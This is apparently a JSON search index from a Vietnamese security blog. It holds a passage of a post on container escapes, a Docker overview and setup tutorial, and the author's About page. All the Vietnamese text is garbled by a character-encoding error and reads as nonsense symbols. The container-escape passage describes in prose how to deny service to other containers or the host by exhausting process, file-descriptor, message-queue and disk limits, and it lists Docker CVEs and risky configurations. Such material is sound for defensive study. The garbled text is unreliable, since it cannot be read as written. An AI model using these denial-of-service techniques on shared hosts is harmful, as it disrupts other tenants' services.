ch·ªß ƒë∆∞·ª£c chia s·∫ª ƒë·∫ª √°p d·ª•ng). Ch√∫ng ta s·∫Ω c√≥ m·ªôt b√†i vi·∫øt ri√™ng ƒë·ªÉ th·∫£o lu·∫≠n v·ªÅ c√°ch t·∫•n c√¥ng n√†y, tuy nhi√™n ch√∫ng ta c√≥ m·ªôt s·ªë kh√°i ni·ªám c·∫ßn l∆∞u √Ω:\n pending Signals: ƒê√¢y l√† gi·ªõi h·∫°n cho m·ªói ng∆∞·ªùi d√πng v·ªÅ s·ªë l∆∞·ª£ng t√≠n hi·ªáu ƒëang ch·ªù x·ª≠ l√Ω t·ªëi ƒëa c√≥ th·ªÉ ƒë∆∞·ª£c x·∫øp h√†ng ƒë·ª£i trong t·∫•t c·∫£ c√°c process c·ªßa ng∆∞·ªùi d√πng. process ch·∫°y trong m·ªôt container c√≥ th·ªÉ x·∫øp h√†ng ƒë·ª£i s·ªë l∆∞·ª£ng tin hi·ªáu ƒëang ch·ªù x·ª≠ l√Ω t·ªëi ƒëa, ngƒÉn c√°c qu√° tr√¨nh trong c√°c process kh√°c nh·∫≠n ƒë∆∞·ª£c t√≠n hi·ªáu ƒëang ch·ªù x·ª≠ l√Ω. Th·ª±c nghi·ªám cho th·∫•y, ƒëi·ªÅu n√†y l√†m ·∫£nh h∆∞·ªüng ƒë·∫øn c·∫£ LXC v√† Docker. Posix Message Queues: gi·ªõi h·∫°n s·ªë l∆∞·ª£ng t√†i nuy√™n t·ªëi ƒëa c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng tr√™n h√†ng ƒë·ª£i th√¥ng ƒëi·ªáp POSIX. Qu√° tr√¨nh ch·∫°y tr√™n m·ªôt container c√≥ th·ªÉ l√†m c·∫°n ki·ªát t·∫•t c·∫£ b·ªô nh·ªõ h√†ng ƒë·ª£i th√¥ng ƒëi·ªáp POSIX c√≥ s·∫µn, ngƒÉn c√°c process trong container kh√°c t·∫°o ho·∫∑c g·ª≠i th√¥ng ƒëi·ªáp ƒë·∫øn h√†ng ƒë·ª£i th√¥ng ƒëi·ªáp POSIX, Th·ª≠ nghi·ªám cho th·∫•y vi·ªác n√†y v·∫´n ƒëang ho·∫°t ƒë·ªông tr√™n LXC v√† Docker. Max User Processes: gi·ªõi h·∫°n cho m·ªói ng∆∞·ªùi d√πng v·ªÅ s·ªë l∆∞·ª£ng process t·ªëi ƒëa. ƒêi·ªÅu n√†y c√≥ th·ªÉ d·ªÖ d√†ng ƒë∆∞·ª£c khai th√°c ƒë·ªÉ t·∫°o ra m·ªôt Dos ƒë∆°n gi·∫£n ch·ªëng l·∫°i c√°c container kh√°c, c≈©ng nh∆∞ m√°y ch·ªß. Th·ª≠ nghi·ªám cho th·∫•y cu·ªôc t·∫•n c√¥ng n√†y r·∫•t th√†nh c√¥ng tr√™n LXC (v√† c√≥ th·ªÉ l√†m h·ªèng to√†n b·ªô m√°y ch·ªß) trong khi tr√™n Docker ch·ªâ c√≥ th·ªÉ h·∫° t·∫•t c·∫£ v√πng ch·ª©a Docker (m√°y ch·ªß v·∫´n ·ªïn ƒë·ªãnh). L∆∞u √Ω, Linux 4.3 ƒë√£ th√™m kh·∫£ nƒÉng gi·ªõi h·∫°n t√†i nguy√™n PID, ƒëi·ªÅu n√†y gi√∫p c√°c h·ªá th·ªëng container gi·∫£m thi·∫øu v·∫•n ƒë·ªÅ n√†y. Max Files: ƒê√¢y l√† gi·ªõi h·∫°n cho m·ªói ng∆∞·ªùi d√πng v·ªÅ s·ªë l∆∞·ª£ng b·ªô m√¥ t·∫£ t·ªáp t·ªëi ƒëa c√≥ th·ªÉ m·ªü. Tren c·∫£ LXC v√† Docker, ƒë√¢y l√† m·ªôt c√°ch d·ªÖ d√†ng ƒë·ªÉ Dos t·∫•t c·∫£ c√°c container kh√°c ƒëang ch·∫°y tr√™n c√πng 1 m√°y ch·ªß.\nB·ªè qua ulimit, hai ƒëi·ªÅu ki·ªán Dos kh√°c c√≥ th·ªÉ ƒë∆∞·ª£c khai th√°c trong container nh∆∞ sau: Disk Space: c√≥ l·∫Ω, Dos ƒë∆°n gi·∫£n nh·∫•t ƒë·ªÉ t·∫•n c√¥ng h·ªá th·ªëng container l√† l√†m cho ·ªï ƒëƒ©a b·ªã full. Th·ª≠ nghi·ªám, cho th·∫•y ƒëi·ªÅu n√†y ƒë√£ ho·∫°t ƒë·ªông tr√™n LXC v√† Docker. Kh√¥ng gi·ªëng nh∆∞ m·ªôt s√¥ cu·ªôc t·∫•n c√¥ng Dos ·ªü tr√™n, th∆∞·ªùng c√≥ th·ªÉ l√†m h·ªèng m√°y ch√∫ ho·∫°c g√¢y ra b·∫•t ·ªïn ƒë·ªß ƒë·ªÉ ch√∫ng kh√≥ d·ªçn d·∫πp, c√°ch n√†y cung c·∫•p kh·∫£ nƒÉng ƒë∆°n gi·∫£n nh·∫•t ƒë·ªÉ t·∫°o ra m·ªôt Dos v√† sau ƒë√≥ d·ªçn d·∫πp n√≥ m·ªôt c√°ch nhanh ch√≥ng. K·∫øt h·ª£p v·ªõi PID Namespacing Info-Leak, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p container c·ªßa k·∫ª t·∫•n c√¥ng nh·∫±m m·ª•c ti√™u ƒë·∫øn nh·ªØng ng∆∞·ªùi thu√™ kh√°c tr√™n c√πng m·ªôt m√°y ch·ªß ƒë∆∞·ª£c chia s·∫ª, ch·ªâ t·∫°o ƒëi·ªÅu ki·ªán Dos c√≥ ch·ªçn l·ªçc khi m·ªôt s·ªë container ho·∫∑c process kh√°c ƒëang ch·∫°y. Global File Descriptor Limits: H·ªá th·ªëng duy tr√¨ gi·ªõi h·∫°n v·ªÅ s·ªë l∆∞·ª£ng b·ªô m√¥ t·∫£ t·ªáp t·ªëi ƒëa c√≥ s·∫µn t·ªïn th·ªÉ (c√≥ s·∫µn t·∫°i /proc/sys.fs.filemax, nh∆∞ th·∫£o lu·∫≠n tr∆∞·ªõc ƒë√≥, container kh√¥ng th·ªÉ ghi v√†o). N·∫øu container kh√¥ng chia s·∫ª UID v√† c√≥ b·ªô ulimit v·ªÅ s·ªë b·ªô m√¥ t·∫£ t·ªáp m√† ch√∫ng ta c√≥ th·ªÉ m·ªü, container v·∫´n c√≥ th·ªÉ c·ªë g·∫Øng DoS m√°y ch·ªß v√† c√°c contaienr kh√°c b·∫±ng c√°ch m·ªü s√¥ l∆∞∆°ng FD t·ªëi ƒëa cho ph√©p khi m·ªói ng∆∞·ªùi d√πng trong user namespace c·ªßa h·ªç, cung c·∫•p kh·∫£ nƒÉng ti√™u th·ª• FD ƒë∆∞·ª£c khu·∫øch ƒë·∫°i r·∫•t nhi·ªÅu. ƒê√¢y th∆∞·ªùng l√† Dos \u0026ldquo;last line\u0026rdquo; v√† ch·ªâ ƒë∆∞·ª£c ƒë∆∞·ª£c thi·ªán n·∫øu c√°c bi√™n ph√°p gi·∫£m nh·∫π cho c√°c vector kh√°c (ƒë∆°n gian h∆°n) ƒë∆∞·ª£c ƒë∆∞a ra.  Container Engine Vulnerabilities M·ªôt s·ªë l·ªó h·ªïng v√† c√°ch khai th√°c.\nDocker Vulnerabilities    Weak/proc permissions Host FD leakage Symlinks     CVE-2015-3630 CVE-2015-3627 CVE-2015-3627   CVE-2015-3631 CVE-2019-15664 CVE-2015-3629     CVE-2019-15664    Escape via Insecure Configuration  Bad idea #1: Exposed Docker Socket Bad idea #2: \u0026ndash;privileged container Bad idea #3: Excessive Capabilities Bad idea #4: Sensitive mounts  Kernel Exploitation The security model of containers is predicated on kernel integrity\nDirty CoW (CVE-2016-5195) ","description":"T√¨m hi·ªÉu v·ªÅ Container Escapes","id":18,"section":"posts","tags":["Docker"],"title":"T√¨m hi·ªÉu v·ªÅ Container Escapes","uri":"https://minhlongmt183.github.io/posts/container-escapes/"},{"content":"To√†n b·ªô series n√†y ƒë∆∞·ª£c tham kh·∫£o t·ª´ hai ngu·ªìn ch√≠nh: XuanThuLabChanel v√† DockerDoc. Em xin ch√¢n th√†nh c·∫£m ∆°n s·ª± c·ªëng hi·∫øn c·ªßa c√°c t√°c gi·∫£ c·ªßa nh·ªØng k√™nh n√≥i tr√™n.‚ù§Ô∏è‚ù§Ô∏è‚ù§Ô∏è\r T·ªïng quan v·ªÅ Docker Docker l√† g√¨?  Docker l√† m·ªôt container platform ƒë·ªÉ ph√°t tri·ªÉn, tri·ªÉn khai v√† qu·∫£n l√≠ ·ª©ng d·ª•ng nhanh ch√≥ng. Docker l√† n·ªÅn t·∫£ng m·ªü (open platform) ƒë·ªÉ ph√°t tri·ªÉn (developing), v·∫≠n chuy·ªÉn (shipping) ho·∫∑c ch·∫°y (running) c√°c ·ª©ng d·ª•ng. Docker cho ph√©p ·ª©ng d·ª•ng c·ªßa ch√∫ng ta ƒë·ªôc l·∫≠p v·ªõi c∆° s·ªü h·∫° t·∫ßng (infrastructure) c·ªßa m√°y, do ƒë√≥, ch√∫ng ta c√≥ th·ªÉ d·ªÖ d√†ng chia s·∫ª ·ª©ng d·ª•ng m·ªôt c√°ch d·ªÖ d√†ng gi·ªØa c√°c thi·∫øt b·ªã. Ch√∫ng ta c√≥ th·ªÉ qu·∫£n l√≠ c·ªü s·ªü h·∫° t·∫ßng (infrastructure) gi·ªëng nh∆∞ c√°ch qu·∫£n l√≠ nh·ªØng ·ª©ng d·ª•ng tr√™n m√°y. S·ª≠ d·ª•ng LibContainer ƒë·ªÉ qu·∫£n l√Ω nh·ªØng function c·ªßa Linux kernel v√† s·ª≠ d·ª•ng nh·ªØng nh√≥m c√¥ng ngh·ªá ƒë·ªôc l·∫≠p nh∆∞: Namespaces, Control Groups, AppArmor, security profiles, network interface, rule for the firewall necessary for the operation of containers.  The Docker platform  Docker cung c·∫•p m·ªôt kh·∫£ nƒÉng ƒë√≥ng g√≥i v√† ch·∫°y ·ª©ng d·ª•ng tr√™n m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p, kh·∫£ nƒÉng n√†y g·ªçi l√† container. Container nh·∫π v√† ch·ª©a t·∫•t c·∫£ nh·ªØng th·ª©c c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y ·ª©ng d·ª•ng, do ƒë√≥, ch√∫ng ta ch·ªâ c·∫ßn t·∫£i v·ªÅ v√† ch·∫°y tr√™n m√°y c√° nh√¢n (host). Ngo√†i ra, m√¥i tr∆∞·ªùng ƒë∆∞·ª£c ch·∫°y l√† m√¥i tr∆∞·ªùng ƒë·ªôc l·∫≠p v√† b·∫£o m·∫≠t (security) cho ph√©p ch√∫ng ta ch·∫°y nhi·ªÅu container ƒë·ªìng th·ªùi v√† d·ªÖ d√†ng chia s·∫ª container trong khi ch√∫ng ta l√†m vi·ªác, v√† ƒë·∫£m b·∫£o t·∫•t c·∫£ m·ªçi ng∆∞·ªùi ƒë·ªÅu ƒë∆∞·ª£c ch√∫ng ta chia s·∫ª m·ªôt container s·∫Ω c√≥ chung 1 m√¥i tr∆∞·ªùng th·ª±c thi ·ª©ng d·ª•ng, v√† cho k·∫øt qu·∫£ th·ª±c thi gi·ªëng nhau. Docker cung c·∫•p c√¥ng c·ª• v√† n·ªÅn t·∫£ng ƒë·ªÉ qu·∫£n l√≠ v√≤ng ƒë·ªùi (lifecycle) containers c·ªßa ch√∫ng ta:  Ph√°t tri·ªÉn ·ª©ng d·ª•ng c·ªßa ch√∫ng ta v√† h·ªó tr·ª£ nh·ªØng th√†nh ph·∫ßn ƒë·ªÉ ·ª©ng d·ª•ng c√≥ th·ªÉ s·ª≠ d·ª•ng container. Container tr·ªü th√†nh m·ªôt ƒë∆°n v·ªã (unit) ƒë·ªÉ ph√¢n ph·ªëi v√† ki·ªÉm tra ·ª©ng d·ª•ng c·ªßa ch√∫ng ta.    D√πng docker ƒë·ªÉ l√†m g√¨? Nhanh, ph√¢n ph·ªëi nh·∫•t qu√°n ·ª©ng d·ª•ng c·ªßa ch√∫ng ta Docker s·∫Øp x·∫øp h·ª£p l√≠ v√≤ng ƒë·ªùi ph√°t tri·ªÉn b·∫±ng c√°ch cho ph√©p c√°c developers l√†m vi·ªác trong m√¥i tr∆∞·ªùng chu·∫©n, s·ª≠ d·ª•ng local container - n∆°i cung c·∫•p nh·ªØng ·ª©ng d·ª•ng v√† d·ªãch v·ª• (services). Conatiner l√† m·ªôt gi·∫£i ph√°p cho quy tr√¨nh l√†m vi·ªác CI/CD (continuous integration and continuous delivery).\nKh·∫£ nƒÉng tri·ªÉn khai v√† m·ªü r·ªông  N·ªÅn t·∫£ng d·ª±a c·ªßa container docker ƒë√°p ·ª©ng cho kh·ªëi c√¥ng vi·ªác c√≥ kh·∫£ nƒÉng linh ƒë·ªông cao. Docker container c√≥ th·ªÉ ch·∫°y tr√™n laptop c·ªßa l·∫≠p tr√¨nh vi√™n, c√≥ th·ªÉ ch·∫°y tr√™n m√°y th·∫≠t ho·∫∑c m√°y ·∫£o trong c√°c data center, tr√™n clouder provider, ho·∫∑c trong h·ªón h·ª£p c√°c m√¥i tr∆∞·ªùng (mixture of environments) T√≠nh linh ƒë·ªông v√† nh·∫π c·ªßa docker l√†m cho n√≥ d·ªÖ d√†ng trong vi·ªác qu·∫£n l√Ω ƒë·ªông c√°c c√¥ng vi·ªác, m·ªü r·ªông ho·∫∑c chia nh·ªè c√°c ·ª©ng d·ª•ng, d·ªãch v·ª• theo nhu c·∫ßu kinh doanh, trong th·ªùi gian th·ª±c.  Ch·∫°y ƒë∆∞·ª£c nhi√™u c√¥ng vi·ªác h∆°n trong c√πng m·ªôt ph·∫ßn c·ª©ng (hardware). V√¨ docker nh·∫π v√† nhanh, n√≥ c√≥ kh·∫£ nƒÉng thay th·∫ø nh·ªØng m√°y ·∫£o ƒë∆∞·ª£c x√¢y d·ª±ng d·ª±a tr√™n hypervisor, ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng nhi·ªÅu kh·∫£ nƒÉng t√≠nh to√°n h∆°n ƒë·ªÉ th·ª±c hi·ªán m·ª•c ti√™u c·ªßa m√¨nh. Docker ho·∫°t ƒë·ªông hi·ªáu qu·∫£ cho c·∫£ m√¥i tr∆∞·ªùng tri·ªÉn khai c√≥ m·∫≠t ƒë·ªô cao, v·ª´a ho·∫∑c nh·ªè, n∆°i m√† ch√∫ng ta c·∫ßn l√†m vi·ªác v·ªõi √≠t t√†i nguy√™n h∆°n.\nKi·∫øn tr√∫c c·ªßa Docker.  Docker s·ª≠ d·ª•ng ki·∫øn tr√∫c client-server. Docker client s·∫Ω n√≥i chuy·ªán v·ªõi docker daemon - tr√¨nh th·ª±c hi·ªán x√¢y d·ª±ng, ch·∫°y, ph√¢n ph·ªëi docker container c·ªßa ch√∫ng ta.  Docker client v√† daemon c√≥ th·ªÉ ch·∫°y tr√™n c√πng 1 h·ªá th·ªëng, ho·∫∑c c√≥ th·ªÉ k·∫øt n·ªëi docker client t·ªõi m·ªôt tr√¨nh ƒëi·ªÅu khi·ªÉn docker daemon (remote docker daemon) Ch√∫ng giao ti·∫øp v·ªõi nhau th√¥ng qua s·ª≠ d·ª•ng REST API, qua UNIX sockets ho·∫∑c network interface.    The Docker Daemon( dockerd) L·∫Øng nghe nh·ªØng y√™u c·∫ßu t·ª´ Docker API v√† qu·∫£n l√≠ ƒë·ªëi t∆∞·ª£ng c·ªßa docker nh∆∞: images, container, networks, volumes. M·ªôt daemon can th·ªÉ giao ti·∫øp v·ªõi nh·ªØng daemons kh√°c ƒë·ªÉ qu·∫£n l√≠ docker services.\nThe Docker client (docker) L√† c√°ch m√† ng∆∞·ªùi d√πng t∆∞∆°ng t√°c v·ªõi docker. khi ch√∫ng ta th·ª±c hi·ªán nh·ªØng c√¢u l·ªánh nh∆∞ docker run, client s·∫Ω g·ª≠i c√¢u l·ªánh n√†y v·ªõi dockered ƒë·ªÉ ƒëem ch√∫ng ra ngo√†i. L·ªánh docker s·ª≠ d·ª•ng Docker API. Docker client c√≥ th·ªÉ giao ti·∫øp v·ªõi m·ªôt ho·∫∑c nhi·ªÅu daemon.\nDocker registries M√¥t docker registry l∆∞u tr·ªØ Docker images. Docker Hub l√† m·ªôt public registry m√† m·ªçi ng∆∞·ªùi ƒë·ªÅu c√≥ th·ªÉ s·ª≠ d·ª•ng, v√† docker ƒë∆∞·ª£c c·∫•u h√¨nh m·∫∑c ƒë·ªãnh ƒë·ªÉ t√¨m ki·∫øm nh·ªØng images tr√™n Docker Hub. ch√∫ng ta c√≤n c√≥ th·ªÉ ch·∫°y nh·ªØng registry c·ªßa ri√™ng ch√∫ng ta.\nKhi ch√∫ng ta th·ª±c hi·ªán l·ªánh docker pull ho·∫∑c docker run, nh·ªØng images y√™u c·∫ßu s·∫Ω ƒë∆∞·ª£c k√©o t·ª´ registry c·ªßa ch√∫ng ta v·ªÅ m√°y, v√† khi th·ª±c hi·ªán l·ªánh docker push, images c·ªßa ch√∫ng ta s·∫Ω ƒë∆∞·ª£c ƒë·∫©y l√™n tr√™n registry.\nDocker Object Images M·ªôt image l√† m·ªôt m·∫´u ch·ªâ ƒë·ªçc v·ªõi t·∫≠p l·ªánh ƒë·ªÉ t·∫°o ra m·ªôt docker container. Th√¥ng th∆∞·ªùng, m·ªôt image d·ª±a tr√™n nh·ªØng image kh√°c v·ªõi m·ªôt s·ªë t√πy ch·ªânh b·ªï sung. V√≠ d·ª•, ch√∫ng ta mu·ªën x√¢y d·ª±ng m·ªôt image d·ª±a tr√™n ubuntu image, nh∆∞ng c√≥ c√†i th√™m Apache web server, ·ª©ng d·ª•ng ri√™ng c·ªßa ch√∫ng ta c≈©ng nh∆∞ nh·ªØng c·∫•u h√¨nh c·∫ßn thi·∫øt ƒë·ªÉ c√≥ ·ª©ng d·ª•ng ch·∫°y.\nch√∫ng ta c√≥ th·ªÉ t·∫°o images ri√™ng ho·∫∑c s·ª≠ d·ª•ng nh·ªØng images ƒë√£ c√≥ s·∫µn tr√™n c√°c registry.\nƒê·ªÉ x√¢y d·ª±ng ri√™ng images, ch√∫ng ta t·∫°o Dockfile v·ªõi nh·ªØng c√∫ ph√°p ƒë∆°n gi·∫£n ƒë·ªãnh nghƒ©a c√°c b∆∞·ªõc c·∫ßn thi·∫øt ƒë·ªÉ t·∫°o image v√† ch·∫°y n√≥. M·ªói c√¢u l·ªánh trong Dockerfile t·∫°o m·ªôt layer trong image. Khi b·∫°n thay ƒë·ªïi Dockerfile v√† rebuild image, ch·ªâ nh·ªØng layer b·ªã thay ƒë·ªïi m·ªõi buil l·∫°i. ƒê√¢y ch√≠nh l√† l√≠ do l√†m cho image tr·ªü n√™n nh·∫π, nh·ªè, nhanh khi ƒëem so s√°nh v·ªõi nh·ªØng c√¥ng ngh·ªá ·∫£o h√≥a kh√°c.\nContainers  Docker ƒë√≥ng g√≥i ph·∫ßn m·ªÅm th√†nh m·ªôt ƒë∆°n v·ªã chu·∫©n, g·ªçi l√† container, n∆°i l∆∞u t·∫•t c·∫£ nh·ªØng th·ª© c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y ph·∫ßn m·ªÅm, bao g·ªìm: libraries, systemtools, and code M·ªôt container c√≥ th·ªÉ ch·∫°y m·ªôt images. Ch√∫ng ta c√≥ th·ªÉ create, start, stop, move, delete m·ªôt container b·∫±ng s·ª≠ d·ª•ng Docker API ho·∫∑c CLI. Ch√∫ng ta c√≥ th·ªÉ k·∫øt n·ªëi t·ª´ m·ªôt container t·ªõi m·ªôt ho·∫∑c nhi·ªÅu networks, ƒë√≠nh k√®m b·ªô nh·ªõ v√†o trong n√≥, ho·∫∑c th√¢m ch√≠ c√≥ th·ªÉ t·∫°o ra m·ªôt image m·ªõi d·ª±a tr√™n tr·∫°ng th√°i hi·ªán t·∫°i c·ªßa n√≥. Theo m·∫∑c ƒë·ªãnh, m·ªôt container ƒë·ªôc l·∫≠p v·ªõi nh·ªØng container kh√°c v√† v·ªõi host machine. Ch√∫ng ta c√≥ th·ªÉ ki·ªÉm so√°t m·ª©c ƒë·ªô ƒë·ªôc l·∫≠p c·ªßa network, b·ªô nh·ªõ ho·∫∑c nh·ªØng h·ªá th·ªëng con c∆° b·∫£n t·ª´ m√¥t container t·ªõi nh·ªØng container kh√°c ho·∫∑c t·ª´ host machine t·ªõi nh·ªØng container. M·ªôt container ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a b·ªüi images c·ªßa n√≥, c≈©ng nh∆∞ b·∫•t k·ª≥ t√πy ch·ªçn c·∫•u h√¨nh n√†o b·∫°n cung c·∫•p cho n√≥ khi t·∫°o ho·∫∑c kh·ªüi ƒë·ªông n√≥. Khi m·ªôt container b·ªã x√≥a, nh·ªØng thay ƒë·ªïi v·ªÅ tr·∫°ng th√°i c·ªßa n√≥ kh√¥ng ƒë∆∞·ª£c l∆∞u m√† s·∫Ω b·ªã x√≥a.  V√≠ d·ª• v·ªÅ docker run command Nh·ªØng c√¢u l·ªánh sau run m·ªôt ubuntu container:\n1  $ docker run -i -t ubuntu /bin/bash\r  Khi ch√∫ng ta ch·∫°y l·ªánh n√†y, qu√° tr√¨nh th·ª±c hi·ªán s·∫Ω nh∆∞u sau (x√©t tr∆∞·ªùng h·ª£p c·∫•u h√¨nh l√† default):\n1. N·∫øu ch√∫ng ta kh√¥ng c√≥ ubuntu image ·ªü local, Docker pulls n√≥ t·ª´ configured registry c·ªßa ch√∫ng ta, ch√∫ng ta c√≥ th·ªÉ k√©o n√≥ xu·ªëng b·∫±ng c√¢u l·ªánh: docker pull ubuntu\n2. Docker t·∫°o ra m·ªôt container m·ªõi, ch√∫ng ta c√≥ th·ªÉ t·ª± th·ª±c hi·ªán b·∫±ng l·ªánh: docker container create.\n3. Docker ph√¢n b·ªï read-write filesystem v√†o container, nh∆∞ l√† l·ªõp cu·ªëi c√πng c·ªßa n√≥ (final layer). N√≥ cho ph√©p ch·∫°y ƒë·ªÉ t·∫°o ho·∫∑c ch·ªânh s·ª≠a file ho·∫∑c th∆∞ m·ª•c ·ªü local filesystem.\n4. Docker t·∫°o ra network interface ƒë·ªÉ ƒë·ªÉ n·ªëi contain t·ªõi default network, v√¨ ch√∫ng ta kh√¥ng ch·ªâ ƒë·ªãnh b·∫•t k√¨ t√πy ch·ªçn m·∫°ng n√†o - g√°n IP adress v√†o container. Theo ƒë·ªãnh nghƒ©a, container c√≥ th·ªÉ k·∫øt n·ªëi v·ªõi m·∫°ng b√™n ngo√†i th√¥ng qua s·ª≠ d·ª•ng k·∫øt n·ªëi m·∫°ng c·ªßa m√°y host.\n5. Docker ch·∫°y container r·ªìi th·ª±c th√¨ /bin/bash. V√¨ container ƒëang ch·∫°y ·ªü ch·∫ø ƒë·ªô t∆∞∆°ng t√°c v√† g√°n v√†o terminal (-i, -t flags), ch√∫ng ta c√≥ th·ªÉ input t·ª´ keyboard v√† output ƒë∆∞·ª£c ghi v√†o terminal c·ªßa b·∫°n.\n6. Khi ch√∫ng ta g√µ exit ƒë·ªÉ d·ª´ng /bin/bash, container s·∫Ω d·ª´ng nh∆∞ng kh√¥ng b·ªã x√≥a, do ƒë√≥, ta c√≥ th·ªÉ ch·∫°y l·∫°i ho·∫∑c x√≥a n√≥.\nThe underlying technology Docker ƒë∆∞·ª£c vi·∫øt b·∫±ng ng√¥n ng·ªØ GO v√† t·∫≠n d·ª•ng m·ªôt s·ªë t√≠nh nƒÉng t·ª´ Linux kernel ƒë·ªÉ tr·ªü th√†nh ch·ª©c nƒÉng c·ªßa n√≥.\nDocker s·ª≠ d·ª•ng m·ªôt c√¥ng ngh·ªá ƒë∆∞·ª£c g·ªçi l√† namespaces ƒë·ªÉ cung c·∫•p kh√¥ng gian ƒë·ªôc l·∫≠p ƒë∆∞·ª£c g·ªçi l√† container. Khi b·∫°n ch·∫°y m·ªôt container, Docker t·∫°o ra m·ªôt t·∫≠p namespaces cho container ƒë√≥.\nNh·ªØng namespaces cung c·∫•p m·ªôt l·ªõp ƒë·ªôc l·∫≠p, m·ªói kh√≠a c·∫°nh c·ªßa m·ªôt v√πng ch·ª©a ch·∫°y trong m·ªôt kh√¥ng gian t√™n ri√™ng bi·ªát v√† quy·ªÅn truy c·∫≠p c·ªßa n√≥ b·ªã gi·ªõi h·∫°n trong kh√¥ng gian t√™n ƒë√≥.\nC√†i docker Post-installation steps for Linux Qu·∫£n l√Ω docker v·ªõi t∆∞ c√°ch l√† non-root user  Docker daemon k·∫øt n·ªëi v·ªõi Unix socket thay v√¨ c·ªïng TCP. M·∫∑c ƒë·ªãnh, Unix socket ƒë∆∞·ª£c s·ªü h·ªØu b·ªüi root\nv√† nh·ªØng user kh√°c ch·ªâ c√≥ th·ªÉ truy c·∫≠p th√¥ng qua l·ªánh sudo. Do ƒë√≥, Docker daemon lu√¥n lu√¥n ch·∫°y\nv·ªõi t∆∞ c√°ch l√† root user. Ch√∫ng ta c√≥ th·ªÉ thi·∫øt l·∫≠p l·∫°i ƒë·ªÉ ch·∫°y m√† kh√¥ng c·∫ßn l·ªánh sudo b·∫±ng c√°ch t·∫°o ra m·ªôt Unix group l√† docker\nv√† th√™m user v√†o n√≥. Khi docker daemon ch·∫°y, n√≥ t·∫°o m·ªôt Unix socket m√† t·∫•t c·∫£ c√°c th√†nh ph·∫ßn c·ªßa docker group\nc√≥ th·ªÉ truy c·∫≠p v√†o.   T·∫°o docker group:  $ sudo groupadd docker\rTh√™m user v√†o docker group  $ sudo usermod -aG docker $USER\rK√≠ch ho·∫°t s·ª± thay ƒë·ªïi  $ newgrp docker\rConfigure Docker to start on boot  Tr√™n Debian v√† Ubuntu, Docker service m·∫∑c ƒë·ªãnh ƒë∆∞·ª£c c·∫•u h√¨nh ƒë·ªÉ kh·ªüi ƒë·ªông kh√≠ boot. V·ªõi nh·ªØng distros kh√°c, ta c√≥ th·ªÉ s·ª≠ d·ª•ng l·ªánh sau ƒë√¢y ƒë·ªÉ t·ª± ƒë·ªông ch·∫°y:  $ sudo systemctl enable docker.service\r$ sudo systemctl enable containerd.service\r V√† ƒë·ªÉ t·∫Øt ch·∫ø ƒë·ªô tr√™n:  $ sudo systemctl disable docker.service\r$ sudo systemctl disable containerd.service\rC·∫•u h√¨nh n∆°i Docker daemon l·∫Øng nghe ƒë·ªÉ k·∫øt n·ªëi  M·∫∑c ƒë·ªãnh, Docker daemon s·∫Ω nghe k·∫øt n·ªëi ·ªü UNIX socket ƒë·ªÉ ch·∫•p nh·∫≠n c√°c y√™u c·∫ßu t·ª´ local client. Ngo√†i ra, ch√∫ng ta c√≥ th·ªÉ cho ph√©p Docker ch·∫•p nh·∫≠n nh·ªØng y√™u c·∫ßu t·ª´ remote host b·∫±ng vi·ªác c·∫•u h√¨nh ƒë·ªÉ n√≥ l·∫Øng nghe tr√™n m·ªôt ƒë·ªãa ch·ªâ IP v√† m·ªôt c·ªïng, gi·ªëng nh∆∞ UNIX socket.  Configuring remote access with systemd unit file  sudo systemctl edit docker.service ƒë·ªÉ ghi ƒë√® file docker.service. Th√™m / s·ª≠a nh·ªØng l·ªánh sau:  [Service]\rExecStart=\rExecStart=/usr/bin/dockerd -H fd:// -H tcp://127.0.0.1:2375\rL∆∞u file Reload l·∫°i c·∫•u h√¨nh systemctl  $ sudo systemctl daemon-reload\rCh·∫°y l·∫°i Docker  $ sudo systemctl restart docker.service\rKi·ªÉm tra ƒë·∫£m b·∫£o s·ª± thay ƒë·ªïi  $ sudo netstat -lntp | grep dockerd\rConfiguring remote access with daemon.json  Th√™m d√≤ng l·ªánh v√†o /etc/docker/daemon.json ƒë·ªÉ k·∫øt n·ªëi v·ªõi UNIX socket v√† ƒë·ªãa ch·ªâ IP:  {\r\u0026quot;hosts\u0026quot;: [\u0026quot;unix:///var/run/docker.sock\u0026quot;, \u0026quot;tcp://127.0.0.1:2375\u0026quot;]\r}\rKh·ªüi ƒë·ªông l·∫°i Docker Ki·ªÉm tra ƒë·∫£m b·∫£o s·ª± thay ƒë·ªïi  $ sudo netstat -lntp | grep dockerd\rTh√™m nhi·ªÅu c·∫•u h√¨nh kh√°c\n","description":"Docker l√† n·ªÅn t·∫£ng m·ªü (open platform) ƒë·ªÉ ph√°t tri·ªÉn (developing), v·∫≠n chuy·ªÉn (shipping) ho·∫∑c ch·∫°y (running) c√°c ·ª©ng d·ª•ng.","id":19,"section":"posts","tags":["Docker"],"title":"T√¨m hi·ªÉu v·ªÅ docker","uri":"https://minhlongmt183.github.io/posts/docker_overview/"},{"content":"About me\nHi, I\u0026rsquo;m Long Vo Minh, also known as edisc, and I am a passionate cybersecurity researcher and a graduate of HCMUT with a degree in Computer Science.\nDuring my time as a student, I was an active player in Capture the Flag (CTF) competitions, specifically focusing on binary-related challenges (RE-PWN).\nCurrently, I work at ZaloPay as an Associate Security Engineer responsible for penetration testing of infrastructure systems, including on-premises servers and cloud computing services such as AWS and Kubernetes.\nIn addition, I have knowledge of web pen-testing and am currently studying basic security vulnerabilities such as IDOR, XSS, SQLI, and SSRF.\nRecently, I have been glad to be a mentor for talented students at the BKISC club who share the same passion for cybersecurity. I hope to inspire and support the next generation of Bach Khoa security professionals.\n","description":"Edisc","id":21,"section":"","tags":null,"title":"Edisc","uri":"https://minhlongmt183.github.io/about/"}]